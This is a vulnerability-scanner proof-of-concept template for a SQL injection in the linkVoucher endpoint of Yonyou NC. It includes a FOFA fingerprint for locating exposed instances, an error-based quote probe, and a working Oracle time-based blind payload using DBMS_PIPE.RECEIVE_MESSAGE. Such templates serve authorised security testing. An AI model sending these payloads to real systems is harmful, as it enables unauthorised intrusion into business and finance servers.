id: poc-yaml-yongyou-nc-linkvoucher-sqli
info:
  name: 用友 NC linkVoucher SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(2,4)
  t2: t1 * 3
  t3: t2 + 2
requests:
- method: GET
  path: /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1%27)
  expression: status_code == 200 && contains(body,"sql:SELECT") && contains(body,"引号内的字符串没有正确结束")
- method: GET
  path: /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1%27)%20AND%208087=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(97)||CHR(86)||CHR(111),{{.t1}})--%20alWX
  expression: 'status_code == 200 &&

    contains(body,"ufida") &&

    duration > t1 &&

    duration < t3

    '
transport: http
